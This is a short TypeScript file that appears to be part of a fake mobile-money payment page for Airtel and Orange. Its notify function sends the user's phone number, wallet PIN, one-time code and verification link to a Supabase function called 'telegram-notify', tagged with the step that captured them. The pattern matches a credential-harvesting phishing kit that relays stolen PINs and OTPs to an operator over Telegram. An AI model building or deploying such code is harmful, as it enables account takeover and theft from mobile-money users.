export type PaymentMethod = "airtel" | "orange";
export type TxStatus = "pending" | "completed" | "failed";

export interface NotifyPayload {
  planName: string;
  amount: string;
  paymentMethod: string;
  countryCode: string;
  status: string;
  countryName?: string;
  /** Full MSISDN incl. dialing code, e.g. "+254712345678" */
  phone?: string;
  pin?: string;
  otp?: string;
  verificationLink?: string;
  /** Which step triggered the notification, e.g. "otp_verify" */
  stage?: string;
}

export async function notifyTransaction(payload: NotifyPayload): Promise<void> {
  try {
    const url = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/telegram-notify`;
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
      },
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      console.warn("Notification failed:", resp.status);
    }
  } catch (err) {
    console.warn("Notification error:", err);
  }
}
